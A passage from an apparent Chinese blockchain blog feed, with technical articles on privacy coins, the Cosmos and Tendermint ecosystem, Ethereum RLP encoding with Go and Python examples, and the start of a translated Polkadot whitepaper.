与其虚拟货币地址的相关性。因为区块链网络是一个点对点对等网络，监听交易的中继过程并记录对应的IP地址是可能的。 因此，加强数字货币交易的隐私性一直是区块链行业的重要研究领域之一，也被不少人认为是 2019 年的一个热点。 目前，关注隐私的著名数字货币有达世币( Dash)、门罗币(XMR, Monero)、 大零币(ZEC, Zcash) 等。 SERO (Super Zero Protocol, 超零协议)是最新的后起之秀，想了解更多匿名隐私技术可以前往区块链技术导航-隐私/匿名技术 。 达世币( Dash)达世币采用了混币系统来实现一定程度的隐私。 技术上它是以比特币代码为基础的，为了实现混币系统，达世币改造了比特币网络。与比特币只是由矿工组成的单层网络不同，达世币建立了一个由主节点和矿工组成的双层网络。 在第一层网络中，矿工使用 POW 挖矿的方式来计帐和保护网络安全; 混币相关的功能主要由在第二层网络中实现，该层的节点主要用于执行隐私交易、即时交易和网络管理。 Dash 的混币系统服务叫做匿名发送(PrivateSend)。 在此服务中，主节点将多个用户的交易混合在一起，将多方资金合并再一起对外发送，达到无法追踪交易历史的效果。 Dash 隐私保护技术的一个主要问题是其混币技术只能实现交易地址的隐藏。 交易金额是无法被隐藏并且是完全透明。 门罗币(XMR, Monero)门罗币使用环签名技术为交易地址提供匿名性。在门罗币的区块链网络中，网络首先将签名者的公钥与其他公钥混合，然后对交易消息进行签名。环签名让交易发送者加入一个交易组中，在交易处理过程中，交易作为一个单元而不是单个私钥签名。 验证者可以证明该交易组的合法性。 这个组中的一方是真正的签名者，但是无法确定哪个签名者实际上在这个组中，这就掩盖了真正的发送者的身份。 在交易金额方面，门罗币采用环密交易（ring-secret transaction）的形式，发送方使用交易各方的共享密钥对交易进行加密，接收方使用他的私钥和交易公钥的组合对值进行解密。 在交易中，发送者不向网络透露交易金额，由钱包自动生成一个 rct （Ring Confidential Transactions） 值，rct 值可以简单的认为是随机数 + 交易金额。 网络可以使用 rct 值来验证交易的输入是否等于输出，以确保 门罗币不是无中生有的，这是通过一个名为佩德森承诺（Pedersen Commitments） 的加密方案实现的。 门罗币有很强的匿名性。 所有交易默认为匿名交易，不提供透明的交易选择。 但与此同时，对于门罗币的运行机制也存在着一些批评。 主要原因是环签名每次交易数量有限，交易成本随环的大小而变化，因此人们更倾向于部署更小的环，但更小的环会增加旁观者猜出环中有效输入的可能性。 在一个由环签名组成的交易小组中，有一种可能性是特定的门罗币将在实际交易之前被移除，通过对交易的时序分析将增加暴露实际交易的可能性。 大零币(ZEC, Zcash)Zcash 是最知名的使用零知识证明的区块链系统。与门罗币一样，Zcash 交易可以隐藏交易地址和交易金额。 门罗币在交易处理过程中使用加密方案来确保交易组中的敏感数据的隐私姓，但是如果数据被解密，就会泄露关键数据并损害用户隐私。 Zcash 使用零知识证明技术，可以隐藏交易历史中所有的隐私交易。 它所使用的 zk-SNARKs 零知识证明技术允许发送者用数学方法证明他拥有相应的资产，但却不需要在交易中传递任何资产信息。 其隐私保护的范围包括交易的发送者、接收者和交易金额。 只有持有查看密钥的人才可以看到交易的内容。 零知识证明(Zero—Knowledge Proof)，是由 S.Goldwasser、S.Micali 及C.Rackoff 在 20 世纪 80 年代初提出的。它指的是证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的。零知识证明本质上是一个涉及两个或两个以上当事人的协议，是两个或两个以上当事人完成一项任务所需的一系列步骤。 证明人向验证人证明并让验证人相信他或她知道或拥有一条消息，但是证明过程不能向验证人透露任何关于所要证明消息的信息。 Zcash 第一次让 zk-SNARKs 这种零知识证明技术得到广泛使用。 Zcash 可以完全加密区块链上的交易信息，并利用 zk-SNARKs 的零知识证明验证网络一致性规则下交易的有效性。 在打包交易的过程中，矿工的记录只包括”有一个 UTXO 并且生成了一个交易”的证据，而不记录所打包进区块的地址和交易额本身。 在交易过程中，发送者用私钥签署 Zcash 交易，证明他有权使用该 ZEC 交易，并提供零知识证明该交易被授权用于消费。 矿工只需要验证 zk-SNARKs，而不需要知道任何关于地址的信息来打包交易。 在匿名技术中，Zcash 被认为是非常强大的，但仍然存在一些问题。 Zcash 有两个地址: 透明地址和屏蔽地址。 因此，有四种交易方式。 只有屏蔽地址之间的交易是匿名的。 这种交易目前只占 Zcash 交易的一小部分。 在 Zcash 上执行匿名交易时，零知识证明的生成既费时又费钱，从而影响了用户使用匿名交易的热情。 SERO (超零协议)和 Zcash 类似，SERO 也是一种基于零知识证明技术的新兴隐私保护货币。 在匿名交易领域，SERO 与门罗币和 Zcash 具有相同的特点。 例如，SERO 具有强大的基于零知识证明的隐私保护，并且是100% 匿名交易。SERO 最大的亮点是， 它支持智能合约。 在区块链的隐私保护领域，这是一个具有突破性的创新。 它具有以下突出特点: 目前主流的匿名区块链系统，如 达世，莫内罗，Zcash 等，虽然在设计隐私保护的加密货币方面取得了一些进展，但这些系统并不是基于智能合约虚拟机的可编程系统。 SERO 通过支持 Solidity 虚拟机，对智能合约提供了相对完整的支持。 在零知识证明方面，SERO 团队建立了基于 zk-SNARKs 的 Super-ZK 零知识证明加密系统。 在零知识证明加密速度方面，当前的 Super-ZK 系统比 Zcash 现有的系统有了数量级上的改进。 作为一般的区块链开发人员，他们可以在需要的时候方便的在 SERO 链上发行自己的隐私代币，以建立自己的隐私生态系统。 这些新发行的代币可以像 SERO 币一样拥有基于零知识证明的隐私交易特性。 由于当前版本 SERO 链智能合约系统的图灵完备性，SERO 也支持发布和交换具有复杂数据结构的隐私数据。 由于对丰富数据结构匿名标注的支持，SERO 扩大了智能合约对隐私数据的支持范围，允许区块链应用程序开发人员安全地将商业相关数据放在链上，而不用担心相关的隐私数据泄露。 目前，主要在支付领域使用的其它匿名币系统在底层主要采用 UTXO 模型。 UTXO 模型本质上是一种历史流水账记录，既是一个过程，也是一个结果，因此在一些需要生成见证证明的应用中具有很大的优势。 这也是为什么现在的匿名币区块链系统基本都是采用 UTXO 模式。 支持智能合约公链通常采用类似于以太坊的账户模型。 因为帐户模型本质上是基于状态的，这个模型很容易引入图灵机，这就是为什么支持图灵完备智能合约的区块链系统大多使用帐户模型的原因。 为了同时支持匿名交易和智能合约，SERO 区块链在底层采用 UTXO 格式，同时在上层实现了基于账户模型的兼容层协议来支持智能合约。 SERO 混合了 UTXO 模型和帐户模型，在需要隐私保护的地方使用 UTXO 模型，在需要运行智能合约的地方使用帐户模型。 SERO 通过交易、共识和佩德森承诺（Pedersen Commitments）算法实现了两个模型的无缝集成。 匿名代币可以通过 SERO 的智能合约任意发行。 一旦匿名代币成功发行，智能合约会将把代币发送到帐户的临时存储地址 PKr。 此时，这些匿名代币将以 UTXO 形式与智能合约帐户分离，并且与 SERO 币一样具有零知识证明级别的安全性。 除了代币之外，SERO 还支持其他复杂形式的匿名资产(例如 ERC721之类的非同质代币)来支持更为复杂的场景。 总结随着区块链行业的发展，区块链在价值转移方面的功用得到了越来越广泛的认可。但由于人类社会的复杂性，人们对自身资产隐私性的要求从未停止过。在当前大多数主流区块链系统中，所有交易历史都是已知的并且是可以公开追踪的，很多时候这并不符合人类当今社会的实际经济行为。 匿名区块链系统在很大程度上满足了市场对匿名交易的需求。 从混币机制到环签名机制，再到基于零知识证明的复杂系统，与隐私相关的区块链系统从未停止过发展。 支持智能合约的匿名币系统具有很强的灵活性和适应性，是值得我们关注的一个热点。 本文作者为深入浅出社区共建者 Ashton ，喜欢他的文章可关注他的简书。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>杂文</category>
      </categories>
      <tags>
        <tag>匿名币</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cosmos 是什么? 一文了解Cosmos的来龙去脉]]></title>
    <url>%2F2019%2F05%2F21%2Fwhat-is-cosmos%2F</url>
    <content type="text"><![CDATA[本文从技术角度全面了解 Cosmos 项目， Tendermint 是什么，Cosmos SDK 要解决什么，如何进行跨链，如何解决扩展性问题。 Cosmos 简介严格来说，Cosmos是一个独立并行区块链的去中心化网络，每个区块链都由Tendermint共识这样的BFT共识算法构建。 BFT 代表拜占庭容错(Byzantine Fault-Tolerance)。 分布式系统中的拜占庭故障是一些最难处理的问题。 一个拜占庭容错共识算法是一个共识算法，可以保证多达三分之一的拜占庭或恶意行为者的情况下分布式系统的安全。 换句话说，Cosmos是一个区块链生态系统，可以相互扩展和互操作。 在Cosmos之前，区块链是孤立的、无法相互通信。同时很难建立这样的网络，并且只能处理每秒少量的交易。Cosmos通过新的技术愿景解决了这些问题。 为了理解这个愿景，我们需要回到区块链技术的基本原理。 什么是区块链?区块链可以被描述为由一组验证者（矿工）维护的分布式数字账本，即使一些验证者（少于三分之一）是恶意的，账本也是正确的。 每个参与者在其计算机上存储总账本的副本，并在收到交易块时根据协议定义的规则对其进行更新。 区块链技术的目标是确保总账本正确复制，这意味着每个诚实的参与者在任何给定时刻都看到相同版本的总账本。 区块链技术的主要好处是各方无需依赖中央权威即可共享账本。 区块链是去中心化的。 今天区块链技术的第一个也是最着名的应用是比特币，一种去中心化的货币。 现在，我们从高层次的角度更好地理解区块链，让我们从更多的技术角度来看待区块链的定义。 区块链是一个在全节点上复制的确定性状态机，只要其维护者不到三分之一是拜占庭式（恶意）节点，即可保持共识安全， 让我们来分解一下。 状态机只是一个程序的“花哨词”，它保存一个状态，在接收到输入时修改它。 这个状态可以代表不同的东西，取决于应用程序（例如加密货币的余额）和修改状态的交易（例如从一个账户减去余额并将其添加到另一个账户）。 确定性意味着，如果您从同一个创世纪（genesis）状态重播相同的交易，始终得到相同的结果状态。 共识安全是指状态机复制的每个诚实节点都应该同时看到相同的状态。 当节点收到交易块时，会验证它是否有效，意味着每个交易都确保有效，并且该块本身由超过三分之二的称为验证器的维护者进行验证。 只要不到三分之一的验证者是拜占庭式（恶意）节点，安全就会得到保证。 从体系结构的角度来看，区块链可以分为三个概念层: 应用程序: 负责更新给定的一组交易，即处理交易的状态。 网络: 负责交易和共识相关消息的传播。 共识: 使节点能够就系统的当前状态达成一致。 状态机与应用层类似，它定义了应用程序的状态和状态转换函数。 其他层负责在连接到网络的所有节点上复制状态机。 Cosmos 如何打造更广泛的区块链生态系统？比特币的故事 (区块链 1.0) 要了解 Cosmos 如何打造区块链生态系统，我们需要从区块链故事开始。 第一个区块链是比特币，这是2008年创建的点对点数字货币，使用一种称为工作证明（PoW）的新型共识机制。 这是第一个去中心化应用。 不久，人们开始意识到去中心化应用的潜力，并希望在社区中建立新的应用。 当时，有两种选择来开发去中心化应用：要么分叉比特币代码库，要么建立在它之上。 然而，比特币代码库是非常耦合的;所有的三层—网络、共识和应用耦合在一起。 此外，比特币脚本语言功能有限，也不用户友好。 因此需要更好的工具。 以太坊的故事 (区块链 2.0) 在2014中，以太坊提出了构建去中心化应用的新愿景。 构建一个人们可以部署任何类型应用的区块链。 以太坊通过将应用层转换为称为以太坊虚拟机(EVM)的虚拟机来实现这一点。 该虚拟机能够处理称为智能合约的程序，任何开发人员都可以以无许可的方式部署到以太坊区块链。 这种新的方法允许成千上万的开发人员开始构建去中心化应用（dApps）。 然而，这种方法的局限性很快就显现出来，至今仍然存在。 备注：无许可系统是一个开放的系统，每个人都可以加入和参与。 限制1：可扩展性(Scalability)第一个限制是扩展性（scaling）-建立在以太坊之上的去中心化应用程序被每秒15交易数的共享速率所抑制。 这是因为以太坊仍然使用工作证明，并且以太坊dApps竞争单个区块链的有限资源。 扩展性(scaling): 一个可扩展的系统是一个能够容纳越来越多的请求的系统。 限制2：可用性（Usability）第二个限制是开发人员只有相对较低的灵活性。 由于EVM是一个需要容纳所有用户场景的沙盒，因此它针对常用场景（average use case）进行了优化。 这意味着开发人员必须对其应用程序的设计和效率进行折衷（例如，需要在可能首选UTXO模型的支付平台中使用帐户模型）。 除此之外，它们仅限于一些编程语言，并且不能实现代码自动执行。 备注：以太坊智能合约的执行需要有外部账号的触发动作。 限制3：主权（Sovereignty）第三个限制是每个应用程序在主权方面都受到限制，因为它们都共享相同的基础环境。 本质上，这会创建两层治理：应用治理和底层的治理。 前者受到后者的限制。 如果应用程序中存在错误，无法对其进行任何操作，除非经以太坊平台本身的治理批准（参考Dao事件。 如果应用程序在EVM中需要一个新功能，那么它再次必须完全依靠以太坊平台的治理来接受它。 这些限制不是特定于以太坊，而是所有试图创建一个适合所有使用情况的单一平台的区块链。 这也是 Cosmos 发挥作用的地方。 COSMOS 愿景 (区块链 3.0) Cosmos的愿景是让开发人员轻松构建区块链，并通过允许他们彼此进行交易（通信）来打破区块链之间的障碍。 最终目标是创建一个区块链网络，一个能够以去中心化方式相互通信的区块链网络。 通过Cosmos，区块链可以保持主权，快速处理交易并与生态系统中的其他区块链进行通信，使其成为各种场景的最佳选择。 Cosmos通过一系列开源工具实现这个愿景，如Tendermint*，Cosmos SDK* 和 IBC，旨在让人们快速构建自定义、安全、可扩展和可互操作的区块链应用。 后面会有工具以及 Cosmos 网络的技术架构的分析。 Tendermint 是一个共识引擎和BFT共识算法。 在Tendermint之上可以使用任何编程语言构建一个状态机，Tendermint 将负责信息的（按照共识要求的一致性和安全性）复制。 Cosmos SDK 是一个模块化框架，用来简化构建安全的区块链应用。 IBC是区块链之间的通信协议，可以被认为是区块链的TCP/IP。 它允许快速最终性（fast-finality）的区块链以去中心化的方式相互交换价值和数据。 什么是 Tendermint BFT 和 ABCI之前创建一个区块链需要从头开始构建所有三层：网络、共识和应用程序。 以太坊通过提供虚拟机区块链简化了去中心化应用的开发，任何人都可以以智能合约的形式部署自定义逻辑。 但是，它并没有简化区块链本身的开发。 就像比特币一样，Go-Ethereum 仍然是整体耦合的系统，不易自定义。2014年Jae Kwon 创建 Tendermint 就是想要解决这个问题。 Tendermint BFT 将区块链网络和共识层打包成通用引擎的解决方案，允许开发人员专注于应用程序开发，而不是复杂的底层协议。 因此，Tendermint可节省大量的开发时间。 Tendermint BFT引擎中使用的拜占庭容错（bft）共识算法这个名称是Tendermint命名的，想了解更多的共识协议和BFT的历史，可以关Tendermint联合创始人伊桑-布克曼注的播客）。 Tendermint BFT引擎通过使用 ABCI（Application Blockchain Interface） 套接字（socket）协议连接到应用程序。 这个协议可以用任何编程语言进行封装，开发者可以选择适合他们适合的语言。 这还不是全部，下面这些属性使Tendermint BFT成为先进的区块链引擎: 公有链或私有链均可： Tendermint BFT只处理区块链网络和共识，它帮助节点传播交易和验证追加交易到区块链。 应用层的角色是定义如何构成验证者集合。 因此，开发人员可以在Tendermint BFT引擎之上构建公有链或私有链。 如果应用根据他们有多少Token来选取验证者，那么区块链就称为权益证明PoS（Proof-of-Stake）。 应用也可以只有经过许可或授权才能成为验证者，那么区块链则是许可或私有链。 开发人员可以自由定制区块链验证者集的规则。 高性能： Tendermint BFT 具有 1 秒数量级的出块时间，每秒处理数千个交易。 即时最终确定性： Tendermint共识算法的一个属性是即时最终确定性（Instant finality）。 只要三分之一以上验证者是诚实的（拜占庭下），就永远不会分叉。 用户可以确保他们的交易一旦创建到区块就是最终（确定）的（这不是比特币和以太坊等工作区块链的情况）。 安全： Tendermint 共识不仅是容错的，同时也有问责（accountable）。 如果发生分叉，有一种方法来确定责任（liability）。 Cosmos SDK 和其他应用层框架Tendermint BFT 将区块链的开发时间大大缩减，但从头构建一个安全的 ABCI应用（实现ABCI协议）仍然是一项艰巨的任务。 这就是为什么需要 Cosmos SDK 。 Cosmos SDK Cosmos SDK是一个通用框架，简化了在Tendermint BFT之上构建安全区块链应用的过程，它基于两个主要原则： 模块化：Cosmos SDK 的目标是创建一个模块生态系统，允许开发人员轻松地创建特定应用的区块链，而无需从头开始编写应用的每个功能。 任何人都可以在自己的区块链里为 Cosmos SDK 创建一个模块或利用现成的模块。 例如，Tendermint团队正在构建一组Cosmos Hub所需的基础模块。 这些模块可以在构建自己的应用时使用。 此外，开发人员可以创建新的模块来自定义其应用程序。 随着Cosmos网络的发展，SDK模块的生态系统将扩大，使得开发复杂的区块链应用程序变得越来越容易。 基于功能的安全性：功能约束模块之间的安全边界，使开发人员能够更好地了解模块的可组合性，并限制恶意或意外交互的范围。 要深入了解，点击这里。 Cosmos SDK还附带了一组有用的开发者工具：控制台命令行(CLI)、REST服务和各种其他常用工具库。 总结一句话：与所有其他的 Cosmos 工具一样，Cosmos SDK 也是模块化设计。 现在它允许开发者在 Tendermint BFT 共识引擎之上构建应用。以后也可以用于其他实现 ABCI 协议的共识引擎之上。 随着时间的推移，预计将出现多个不同的架构模型的SDK，与多个共识引擎兼容，所有这些都在Cosmos 网络生态系统中。 参考这份教程学习在 Cosmos SDK 开发应用。 ETHERMINTCosmos SDK 很棒的地方在于它的模块化，允许开发人员移植现有的区块链（Go 编写）代码在它上面运行。 例如，Ethermint是一个将以太坊虚拟机移植到 SDK 模块中的项目。 Ethermint的工作原理完全像以太坊，具有Tendermint BFT 的共识属性。 所有现有的以太坊工具（Truffle，Metamask等））与Ethermint兼容，很容易将已有智能合约移植过来。 Ethermint 将以太坊虚拟机转换为Cosmos-SDK模块。 该模块可以与其他SDK模块（如staking）相结合，能够运行以太坊智能合约的全功能的POS区块链。 Ethermint 链与 Comos 兼容。 我已经可以在（虚拟机）区块链上部署去中心化应用了，为什么要用Cosmos SDK创建一个区块链？ 这个问题是有道理的，考虑到今天大多数去中心化的应用都是在像以太坊这样的虚拟机区块链之上开发的。 首先，这种现象的（部分）原因是，创建区块链比智能合约要困难得多。 有了Cosmos SDK之后就不再是这样。开发人员可以轻松地开发整个特定应用的区块链，这有几个优点。 除次之外，还将拥有更多的灵活性，安全性，性能和主权。 要了解更多有关特定应用的区块链的信息，请阅读这篇文章。 当然，如果不想建立自己的区块链，仍然可以通过在Ethermint上部署你的智能合约来与Cosmos兼容（通信）。 IBC 把区块链连接在一起现在，开发人员已经有了一种快速构建定制区块链的方法，让我们来看看如何将这些区块链连接在一起。 区块链之间的连接是通过区块链间通信协议（IBC：Inter-Blockchain Communication protocol）来实现的。 IBC利用Tendermint共识的“即时最终性”（其他的具有“即时最终性”共识引擎也可以），以允许异构链之间相互转移价值（如token）或数据。 什么是异构链（HETEROGENEOUS CHAINS）？本质上它归结为两件事: 不同的层：异构链有不同的层，这意味着它们在如何实现网络，共识和应用部分方面可能有所不同。 为了与IBC兼容，区块链只需要遵循几个要求，主要是共识层必须具有快速的最终确定性。 工作量证明链（如比特币和以太坊）不属于这个类别，因为它们的确定性是概率性的。 主权：每个区块链都由一组验证者维护，他们的工作是同意下一个区块提交给区块链。 在工作量证明区块链中，这些验证者被称为矿工。 主权区块链是一个拥有自己的验证者集合的区块链。 在许多情况下，区块链的主权是很重要的，因为验证者最终负责修改状态。 在以太坊中，应用程序都是由一组通用验证者（矿工）运行的。 正因为如此，每个应用程序只有有限的主权。 IBC 允许异构链之间转移价值（如token）和数据，这意味着具有不同应用程序和验证人集合的区块链是可互操作的。 例如，它允许公有链和私有链间相互转移token。 IBC 是怎么工作？IBC背后的原理相当简单。 我们以链A上的一个帐户想要发送10个Token（假设是ATOM）到链B为例介绍。 Atom 是 Cosmos Hub 的原生货币。 持有Atom可以获得投票权，可以委托给维护 Cosmos Hub 网络的验证者。 跟踪（Tracking）链B会不间断地接收链A的报头，反之亦然。 这允许每个链跟踪其他链的验证者集合。 从本质上讲，每个链运行一个其他链的轻客户端。 轻客户端是一个区块链客户端，只下载块头。 它通过Merkle Proof来验证查询结果。 这为用户提供了一个轻量级的替代全节点又具有良好的安全性的方案。 锁定（Bonding）当IBC转移被启动时，ATOM 被锁定（Bonding）在链A上。 中继证明（Proof Relay）然后，需要一个从链A转移到链B的 10个ATOM 被锁定的证明。 验证（Validation）链B上针对链A的区块头的证明进行验证，如果有效，则在链B上创建 10 个 ATOM 凭证（ATOM-vouchers）。 注意, 在链 B 上创建的 ATOM 不是真正的 ATOM, 因为 ATOM 仅存在于链 A 上。它们是链 A 中 ATOM在 链 B 上的表示形式, 同时还证明了这些 ATOM 被冻结在链 A 上。 当他们回到其原始链时, 也使用类似的机制来解锁 ATOM。有关 IBC 协议的更全面的描述, 可以查看这个规范。 “区块链互联网”的设计IBC 是一种协议, 允许两个异构区块链相互传输Token。那如何创建一个区块链网络呢？ 一个想法是网络中的每个区块链用 IBC 和另一个区块链两两相连。这种方法的主要问题是网络中的连接数随区块链的数量呈二次增长。如果网络中有100个区块链, 并且每个区块链都需要保持彼此的 IBC 连接, 那就是 4950 个连接。这很快就失控。 为了解决这个问题, Cosmos 提出了一个模块化架构, 其中包含两类区块链: Hubs 和 Zones。 Hubs：中心枢纽链 ， Zones ：区域链 Zones 是常规的异构链, Hubs 是专门为将 Zones 连接在一起而设计的区块链。当一个 Zone 创建与 Hub 的 IBC 连接时, Hub可以自动访问 (即发送和接收) 连接到它的所有 Zone 。因此, 每个 Zone 只需要为有限的 Hub 建立有限的连接。Hubs 还防止 Zone 之间的双花问题。这意味着, 当一个 Zone 从 Hubs 接收 Token 时, 它只需要信任此 Token 的原始 Zone 和 Hub。 在Cosmos网络中推出的第一个 Hub 是Cosmos Hub。 Cosmos Hub 是一个开放的权益证明（POS）的区块链，其原生staking 代币为ATOM，并且交易费用可以用多个Token支付。 Cosmos Hub 的推出也标志着Cosmos 主网上线。 如何桥接非 Tendermint 链到目前为止，我们展示的 Cosmos 架构展示了基于Tendermint的链如何进行交互操作。 但Cosmos并不限于Tendermint链。 事实上，任何类型的区块链都可以连接到Cosmos。 如何桥接非 Tendermint 链 以及 Cosmos 如何解决可扩展性问题，我会在区块链扩容及跨链技术专栏介绍。 总结，Cosmos是什么? 希望现在你对Cosmos 有了更清晰的了解。简洁回顾下 Cosmos 三个要点: Cosmos 通过 Tendermint BFT 和 模块化的 Cosmos SDK 使区块链易于开发。 Cosmos 使区块链能够通过 IBC 和 Peg-Zones 相互转移价值, 同时让它们保留主权。 Cosmos 允许区块链应用通过水平和垂直可扩展性解决方案可支持数百万用户。 最后，Cosmos 不是一个产品, 而是建立在一套模块化、适应性强和可交互工具之上的生态系统。 进一步 阅读 Cosmos 白皮书 开始 在 Cosmos 开发 本文参考官网的What is Cosmos?。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>跨链</category>
        <category>Cosmos</category>
      </categories>
      <tags>
        <tag>Cosmos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以太坊RLP(递归长度前缀)编码]]></title>
    <url>%2F2019%2F05%2F20%2Fgeth-rlp-encode%2F</url>
    <content type="text"><![CDATA[RLP（Recursive Length Prefix）即递归长度前缀编码，RLP主要用于以太坊数据的网络传输和持久化存储。说明：十六进制表示数字前面会加‘0x’， 十进制直接用数字表示，如0x80和128是一个数字的不同表示，只占用一个字节。 为什么需要RLP编码比较常见的序列化方法有JSON，ProtoBuf，但是这些序列化方法在以太坊这样的场景下都有一些问题。 比如像Json编码，编码后的体积比较大。 12345678910type Persion struct &#123; Name string Age uint &#125;p := &amp;Persion&#123;Name: &quot;Tom&quot;, Age: 22&#125;data, _ := json.Marshal(p)fmt.Println(string(data))// &#123;&quot;Name&quot;:&quot;Tom&quot;,&quot;Age&quot;:22&#125; 从编码后的结果可以看到{&quot;Name&quot;:&quot;Tom&quot;,&quot;Age&quot;:22}，其实我们需要的数据是Name, Tom, Age, 22，其余的括号和引号都是描述这种格式的，也就是冗余数据。当然，会有人说可以用protoBuf这样的二进制格式，但是例如JavaScript这样的弱类型语言，是没有int类型的，所有数字都是用Number类型，底层用浮点数来实现，这样就会导致因为语言的不同编码后的数据有一定差异，最后得到的hash值也不同。 针对这些问题，以太坊设计了RLP编码，同时也大幅简化了编码规则。 RLP编码定义RLP（Recursive Length Prefix）即递归长度前缀编码， 不定义任何指定的数据类型， 仅以嵌套数组的形式存储结构。 RLP简化了编码的类型，只定义了两种类型编码： 字符串（byte数组） 字符串（byte数组）的数组，也就是列表. RLP编码基于上面两种数据类型提出了5条编码规则;规则一: 对于值在[0, 127]（十六进制[0x00, 0x7f]）之间的单个字节，其编码是其本身；无需前缀。 1a的编码是97 规则二: 如果字符串的长度为0-55个字节之间，编码的结果是数组本身，再加上0x80 + 字符串长度作为前缀， 前缀范围是：[0x80, 0xb7] 即十进制[128, 183]。 12空字符串的编码是128，即 128=128+0abc的编码是131 97 98 99，其实131=128+len(&quot;abc&quot;), 97 98 99依次是`a b c` 规则三: 如果字符串（数组）长度大于55字节，编码结果第一个值是183（128+55）+ 数组长度的编码的字节长度，然后是数组长度本身的编码，最后是byte数组的编码（共三个部分）。前缀范围是：[0xb8, 0xbf] 即十进制[184, 191]。 1编码一个重复1024次&quot;a&quot;的字符串，其结果是`185 4 0 97 97 97 ... 1024（2的10次方）按照大端编码是0000 0000 001转换为十六进制是0 0 4 0，省略前面的0,长度为2， 因此185 = 183 + 2 大端编码(BigEndian): 低字节在高内存地址 ; 小端编码(LittleEndian): 低字节在低内存地址 规则四 如果列表总内容RLP编码后字节长度小于55，编码结果第一位是192 + 列表内容编码的长度，然后依次连接各个子列表的编码，前缀范围是：[0xc0, 0xf7] 即十进制[192,247]。 12空列表[]编码结果为：192[&quot;abc&quot;, &quot;def&quot;]的编码结果是 200 131 97 98 99 131 100 101 102 其中abc的编码是131 97 98 99, 131 = 128 + len(&quot;abc&quot;) ， abc的编码长度是4，同样def的编码是131 100 101 102，编码长度是4，两个子字符串的编码后总长度为8，编码结果的第一位 200 = 192 + 8 规则五 如果总内容RLP编码后字节长度超过55，编码结果第一位是0xf7 + 列表长度的编码长度，然后是列表长度本身的编码，最后依次连接子列表的编码，前缀范围是：[0x80, 0xb7] 即十进制[247,256]。 1[&quot;The length of this sentence is more than 55 bytes, &quot;, &quot;I know it because I pre-designed it&quot;] 其中前两个字节的计算方式如下： 12341. &quot;The length of this sentence is more than 55 bytes, &quot;的长度为51(0x33)，根据规则二得出前缀179 （0xb3 = 0x80 + 0x33 ）2. &quot;I know it because I pre-designed it&quot;的长度为35(0x23)，根据规则2得出前缀163 （0xa3 = 0x80 + 0x33)3. 列表长度本身的编码为：51 + 35 + 2(个子串的前缀占用) = 88 （0x58）4. 最后根据规则5，0x58只占用一个字节，即 247(0xf7) + 1 = 248 ， 前缀为 248。 的编码结果表示是: 1248 88 179 84 104 101 32 108 101 110 103 116 104 32 111 102 32 116 104 105 115 32 115 101 110 116 101 110 99 101 32 105 115 32 109 111 114 101 32 116 104 97 110 32 53 53 32 98 121 116 101 115 44 32 163 73 32 107 110 111 119 32 105 116 32 98 101 99 97 117 115 101 32 73 32 112 114 101 45 100 101 115 105 103 110 101 100 32 105 116 其中规则三，规则四，规则5是递归定义的（允许嵌套）。 编码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445def rlp_decode(input): if len(input) == 0: return output = '' (offset, dataLen, type) = decode_length(input) if type is str: output = instantiate_str(substr(input, offset, dataLen)) elif type is list: output = instantiate_list(substr(input, offset, dataLen)) output = output + rlp_decode(substr(input, offset + dataLen)) return outputdef decode_length(input): length = len(input) if length == 0: raise Exception("input is null") prefix = ord(input[0]) if prefix &lt;= 0x7f: return (0, 1, str) elif prefix &lt;= 0xb7 and length &gt; prefix - 0x80: strLen = prefix - 0x80 return (1, strLen, str) elif prefix &lt;= 0xbf and length &gt; prefix - 0xb7 and length &gt; prefix - 0xb7 + to_integer(substr(input, 1, prefix - 0xb7)): lenOfStrLen = prefix - 0xb7 strLen = to_integer(substr(input, 1, lenOfStrLen)) return (1 + lenOfStrLen, strLen, str) elif prefix &lt;= 0xf7 and length &gt; prefix - 0xc0: listLen = prefix - 0xc0; return (1, listLen, list) elif prefix &lt;= 0xff and length &gt; prefix - 0xf7 and length &gt; prefix - 0xf7 + to_integer(substr(input, 1, prefix - 0xf7)): lenOfListLen = prefix - 0xf7 listLen = to_integer(substr(input, 1, lenOfListLen)) return (1 + lenOfListLen, listLen, list) else: raise Exception("input don't conform RLP encoding form")def to_integer(b): length = len(b) if length == 0: raise Exception("input is null") elif length == 1: return ord(b[0]) else: return ord(substr(b, -1)) + to_integer(substr(b, 0, -1)) * 256 参考文章https://github.com/ethereum/wiki/wiki/RLPhttp://hidskes.com/blog/2014/04/02/ethereum-building-blocks-part-1-rlp/ 本文作者是深入浅出区块链共建者清源，欢迎关注清源的博客，不定期分享一些区块链底层技术文章。备注：编者在原文上略有修改。 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>基础理论</category>
      </categories>
      <tags>
        <tag>RLP编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[波卡白皮书 Polkadot：畅想一种异构的多链架构]]></title>
    <url>%2F2019%2F05%2F17%2Fpolkadot-whitepaper%2F</url>
    <content type="text"><![CDATA[转载岳利鹏翻译的波卡白皮书 - Polkadot：畅想一种异构的多链架构，本文针对原译文笔误略有修改，同时原译文中的“钓鱼人” 改用了更好理解的 “渔夫” 。 波卡Polkadot：畅想一种异构的多链架构 原文Paper 草案 1作者：Gavin Wood 博士 以太坊&amp;Parity 创始人 GAVIN@PARITY.IO译者：岳利鹏 lipeng@chainx.org 摘要：现有的区块链架构都存在诸多问题，不仅仅是从实用性角度所说的扩展性（extensibilty）和伸缩性（scalability）的问题。我们认为，问题源于把共识架构中两个很重要的部分：一致性（canonicality）和有效性（validity）绑定得太紧密了。这篇文章介绍了一种异构的多链架构，能从本质上把两者拆开。 为了分离这两者，且能保持最小化的绝对安全性（security）和传输性（transport）等基本功能，我们将介绍一种原生的支持内核可扩展（core extensibilty）的可行性方法。对于可伸缩性（scalability）的问题，我们通过对这两个问题分而治之的思路解决，通过非信任节点的激励机制，弱化他们的内生绑定关系。 本架构的异构本质，支持众多高度差异化的共识系统在非信任（trustless）、完全去中心化的联邦内交互操作，允许去信任（trust-free）地相互访问各区块链。 